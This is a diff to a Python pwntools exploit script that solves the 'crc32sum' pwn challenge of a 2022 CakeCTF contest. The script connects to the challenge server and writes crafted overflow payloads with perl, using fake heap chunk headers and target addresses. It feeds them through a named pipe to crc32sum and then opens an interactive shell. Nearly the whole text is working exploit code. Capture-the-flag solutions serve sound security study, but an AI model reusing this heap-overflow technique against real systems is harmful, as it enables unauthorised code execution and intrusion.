@@ -7,7 +7,7 @@ TARGET = './crc32sum'
 HOST = 'pwn2.2022.cakectf.com'
 PORT = 9009
 
-elf = ELF(TARGET)
+#elf = ELF(TARGET)
 def start():
 	x = remote (HOST, PORT)
 	cmd = x.recvuntil(b'\n', True)
@@ -25,8 +25,8 @@ r.sendlineafter(prm, b'mkfifo ./fifo')
 r.sendlineafter(prm, b'perl -e \'print "a" x 0x18\' > short')
 r.sendlineafter(prm, b'perl -e \'print "a" x 0x30\' > long')
 r.sendlineafter(prm, b'perl -e \'print "\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00\\x60\\x10\\x40\\x00\\x00\\x00\\x00\\x00\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00\\x60\\x10\\x40\\x00\\x00\\x00\\x00\\x00\\x50\\x10\\x40\\x00\\x00\\x00\\x00\\x00\\x80\\x10\\x40\\x00\\x00\\x00\\x00\\x00" \' > over')
-r.sendline( b'perl -e \'print "\\x00" x 0x18 . "\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00" . "a" x 0x408 . "\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x40\\x40\\x00\\x00\\x00\\x00\\x00"\' > fifo &')
-r.sendlineafter(prm, b'crc32sum ./short .///////////////////////////////////////////////long ./fifo .///////////////////////////////////////////////over /bin/bash')
+r.sendlineafter(prm, b'perl -e \'print "\\x00" x 0x18 . "\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00" . "a" x 0x408 . "\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x40\\x40\\x00\\x00\\x00\\x00\\x00"\' > fifo &')
+r.sendline(b'crc32sum ./short .///////////////////////////////////////////////long ./fifo .///////////////////////////////////////////////over /bin/bash')
 
 r.interactive()
 r.close()
